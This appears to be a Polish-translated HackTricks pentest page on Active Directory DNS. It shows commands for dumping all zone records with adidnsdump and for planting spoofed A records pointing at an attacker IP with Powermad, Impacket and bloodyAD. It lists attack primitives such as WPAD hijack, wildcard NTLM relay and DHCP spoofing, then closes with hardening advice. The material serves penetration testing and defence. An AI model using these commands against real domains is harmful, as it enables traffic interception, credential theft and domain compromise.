# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Domyślnie **każdy użytkownik** w Active Directory może **enumerować wszystkie rekordy DNS** w strefach DNS domeny lub lasu, podobnie jak w przypadku transferu strefy (użytkownicy mogą wylistować obiekty podrzędne strefy DNS w środowisku AD).

Narzędzie [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) umożliwia **enumerację** i **eksportowanie** **wszystkich rekordów DNS** w strefie w celach rekonesansu wewnętrznych sieci.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (kwiecień 2025) dodaje wyjście JSON/Greppable (`--json`), wielowątkowe rozwiązywanie DNS oraz wsparcie dla TLS 1.2/1.3 podczas łączenia z LDAPS

Aby uzyskać więcej informacji, przeczytaj [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Tworzenie / Modyfikowanie rekordów (ADIDNS spoofing)

Ponieważ grupa **Authenticated Users** ma domyślnie **Create Child** w DACL strefy, każde konto domenowe (lub konto komputera) może rejestrować dodatkowe rekordy. Może to być wykorzystane do przechwytywania ruchu, wymuszenia NTLM relay lub nawet pełnego kompromitowania domeny.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py jest dostarczany z Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Powszechne prymitywy ataku

1. **Rekord dziki** – `*.<zone>` przekształca serwer AD DNS w ogólnofirmowego respondenta podobnego do spoofingu LLMNR/NBNS. Może być wykorzystywany do przechwytywania hashy NTLM lub do ich relaying do LDAP/SMB.  (Wymaga wyłączenia WINS-lookup.)
2. **Hajack WPAD** – dodaj `wpad` (lub rekord **NS** wskazujący na hosta atakującego, aby obejść Global-Query-Block-List) i przezroczysto proxyj outboundowe żądania HTTP, aby zbierać dane uwierzytelniające.  Microsoft załatał obejścia dzikiego/ DNAME (CVE-2018-8320), ale **rekordy NS nadal działają**.
3. **Przejęcie przestarzałego wpisu** – przejmij adres IP, który wcześniej należał do stacji roboczej, a powiązany wpis DNS nadal będzie się rozwiązywał, umożliwiając ataki oparte na delegacji ograniczonej zasobami lub ataki Shadow-Credentials bez dotykania DNS w ogóle.
4. **Spoofing DHCP → DNS** – w domyślnej instalacji Windows DHCP+DNS nieautoryzowany atakujący w tej samej podsieci może nadpisać dowolny istniejący rekord A (w tym kontrolery domeny) wysyłając sfałszowane żądania DHCP, które wyzwalają dynamiczne aktualizacje DNS (Akamai “DDSpoof”, 2023).  To daje maszynę w środku nad Kerberos/LDAP i może prowadzić do pełnego przejęcia domeny.
5. **Certifried (CVE-2022-26923)** – zmień `dNSHostName` konta maszyny, które kontrolujesz, zarejestruj odpowiadający rekord A, a następnie zażądaj certyfikatu dla tej nazwy, aby udawać DC. Narzędzia takie jak **Certipy** lub **BloodyAD** w pełni automatyzują ten proces.

---

## Wykrywanie i wzmacnianie

* Odrzuć **Użytkowników uwierzytelnionych** prawo *Tworzenia wszystkich obiektów podrzędnych* w wrażliwych strefach i deleguj dynamiczne aktualizacje do dedykowanego konta używanego przez DHCP.
* Jeśli wymagane są dynamiczne aktualizacje, ustaw strefę na **Tylko zabezpieczone** i włącz **Ochronę nazw** w DHCP, aby tylko obiekt komputera właściciela mógł nadpisać swój własny rekord.
* Monitoruj identyfikatory zdarzeń serwera DNS 257/252 (dynamiczna aktualizacja), 770 (transfer strefy) oraz zapisy LDAP do `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zablokuj niebezpieczne nazwy (`wpad`, `isatap`, `*`) za pomocą celowo łagodnego rekordu lub poprzez Global Query Block List.
* Utrzymuj serwery DNS w aktualizacji – np. błędy RCE CVE-2024-26224 i CVE-2024-26231 osiągnęły **CVSS 9.8** i są zdalnie wykorzystywalne przeciwko kontrolerom domeny.

## Odnośniki

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, nadal de facto odniesienie do ataków dzikich/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (grudzień 2023)
{{#include ../../banners/hacktricks-training.md}}
